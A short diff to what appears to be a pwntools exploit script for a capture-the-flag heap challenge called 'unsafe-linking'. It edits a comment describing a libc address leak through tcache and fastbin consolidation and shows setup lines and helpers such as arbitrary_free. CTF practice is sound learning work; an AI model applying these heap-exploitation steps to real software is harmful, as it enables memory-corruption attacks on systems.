@@ -8,7 +8,6 @@ p = gdb.debug('./unsafe-linking', '''
     continue
 ''')
 
-# context.timeout = 10
 # p = remote('recruit.osiris.bar', 21006)
 
 def create_note_without_secret(idx, size, data):
@@ -60,7 +59,7 @@ def arbitrary_free(addr_to_free):
 glibc_e = ELF('./libc.so.6')
 glibc_r = ROP('./libc.so.6')
 
-# Stage 1: Leak libc base address (fast dup consolidation; fill the tcache with 7 chunks to trigger the fast dup consolidation when the 8th chunk in the fastbin is malloced and freed with a chunk in the unsorted bin)
+# Stage 1: Leak libc base address (fill the tcache with 7 chunks and let the following freed chunks be in the fastbins to trigger the consolidation when malloc a large chunk that can fit in the unsorted bin)
 create_note_with_secret(0, b'\n')
 create_note_with_secret(1, b'\n')
 create_note_with_secret(2, b'\n')
